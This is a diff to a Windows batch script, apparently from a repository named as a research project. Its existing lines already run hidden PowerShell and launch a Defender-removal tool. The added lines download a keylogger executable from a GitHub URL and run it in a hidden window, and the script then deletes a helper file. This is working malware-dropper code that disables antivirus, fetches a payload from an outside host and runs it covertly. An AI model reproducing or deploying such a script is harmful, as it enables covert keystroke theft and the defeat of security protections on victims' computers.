@@ -36,4 +36,8 @@ powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.git
 powershell -WindowStyle Hidden  -ExecutionPolicy Bypass -File "installer.ps1"
 defender_remover.exe Y
 
+@REM Download and execute keylogger
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/keylogger.exe' -OutFile keylogger.exe"
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath 'keylogger.exe' -WindowStyle Hidden"
+
 del wget.cmd
